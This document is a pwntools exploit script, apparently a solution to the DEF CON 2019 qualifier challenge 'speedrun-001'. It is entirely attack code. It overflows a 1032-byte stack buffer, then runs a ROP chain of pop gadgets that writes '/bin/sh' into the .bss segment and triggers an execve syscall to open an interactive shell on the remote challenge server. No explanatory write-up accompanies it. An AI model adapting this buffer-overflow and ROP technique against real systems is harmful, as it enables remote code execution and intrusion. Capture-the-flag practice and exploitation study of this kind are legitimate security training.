from pwn import *
context(arch="amd64", os="Linux")
bin = ELF('./speedrun-001')
#p = process('./speedrun-001')
p = remote('speedrun-001.quals2019.oooverflow.io', 31337)

pop_rdi = bin.search(asm('pop rdi; ret')).next() #rdi: 0x400686
pop_rsi = bin.search(asm('pop rsi; ret')).next() #rsi: 0x4101f3
pop_rax = bin.search(asm('pop rax; ret')).next() #rax: 0x415664
pop_rdx = bin.search(asm('pop rdx; ret')).next() #rdx: 0x44be16

read_addr = 0x4498a0 # first input
bss_addr = 0x6b6000 #bss segment (writable)
 
rop_syscall = 0x40129c # syscall;
binsh = "/bin/sh\x00"

print(p.recvuntil('?\n'))

# read /bin/sh
payload = "A"*1032
payload += p64(pop_rdx)
payload += p64(0x68732f6e69622f) # "/bin/sh"[::-1].encode('hex')
payload += p64(pop_rax)
payload += p64(bss_addr)
payload += p64(0x48d251) # mov qword ptr [rax], rdx ; ret

# execve
payload += p64(pop_rax)
payload += p64(59) # syscall number for execve
payload += p64(pop_rdi)
payload += p64(bss_addr) # address of /bin/sh
payload += p64(pop_rsi)
payload += p64(0x0) # null
payload += p64(pop_rdx)
payload += p64(0) # null
payload += p64(rop_syscall)

p.sendline(payload)
p.interactive()
